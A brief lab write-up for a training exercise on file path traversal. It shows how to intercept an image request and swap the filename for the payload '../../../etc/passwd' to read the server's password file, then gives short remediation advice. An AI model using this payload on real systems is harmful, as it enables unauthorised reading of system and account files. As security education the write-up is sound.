## 🧪 Lab: File Path Traversal - Simple Case  
**Level**: Apprentice  
**Date**: June 11, 2025  
**Goal**: Read `/etc/passwd` using path traversal.

---

### 🧰 Tools
- Burp Suite (Repeater / Interceptor)

---

### 🧭 Steps

1. **Find and intercept vulnerable image URL**
   - Navigate the product page and locate an image request like:
     ```
     GET /image?filename=218.png
     ```

2. **Send to Repeater**

3. **Inject traversal payload**
   - Replace filename with:
     ```
     ../../../etc/passwd
     ```

4. **Send request**
   - Response returns system file contents:
     ```
     root:x:0:0:root:/root:/bin/bash
     ...
     ```

---

### 💣 Payload
```
../../../etc/passwd
```

---

### 🔒 Remediation
- Sanitize user input.
- Avoid direct file access using user-supplied values.
